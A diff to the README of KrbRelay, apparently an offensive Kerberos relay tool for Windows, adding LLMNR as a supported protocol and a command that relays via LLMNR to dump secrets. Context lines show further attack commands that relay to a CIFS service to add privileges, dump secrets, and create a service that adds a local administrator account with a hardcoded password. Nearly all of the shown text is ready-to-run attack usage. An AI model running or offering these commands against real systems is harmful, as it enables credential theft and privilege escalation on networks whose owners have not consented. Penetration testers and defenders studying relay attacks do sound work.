@@ -11,6 +11,8 @@ This should be working on most fully patched Windows systems. There may be diffi
 
 Some protocols are more completed than others, PR's are welcomed. 
 
+* LLMNR
+
 * LDAP/LDAPS
 * HTTP
   * EWS
@@ -48,6 +50,9 @@ Some protocols are more completed than others, PR's are welcomed.
 .\KrbRelay.exe -spn cifs/win2016.htb.local -session 2 -clsid 354ff91b-5e49-4bdc-a8e6-1cb6c6877182 -add-privileges (([System.Security.Principal.WindowsIdentity]::GetCurrent()).User.Value)
 .\KrbRelay.exe -spn cifs/win2016.htb.local -session 2 -clsid 354ff91b-5e49-4bdc-a8e6-1cb6c6877182 -secrets 
 .\KrbRelay.exe -spn cifs/win2016.htb.local -session 2 -clsid 354ff91b-5e49-4bdc-a8e6-1cb6c6877182 -service-add addUser "C:\windows\system32\cmd.exe /c """"C:\windows\system32\net user cube Password123! /add && C:\windows\system32\net localgroup administrators cube /add"""""
+
+# LLMNR
+.\KrbRelay.exe -llmnr -spn 'cifs/win2019.htb.local' -secrets
 ````
 
  `CheckPort.exe` is a C# tool that can be used to discover available ports for the OXID resolver.
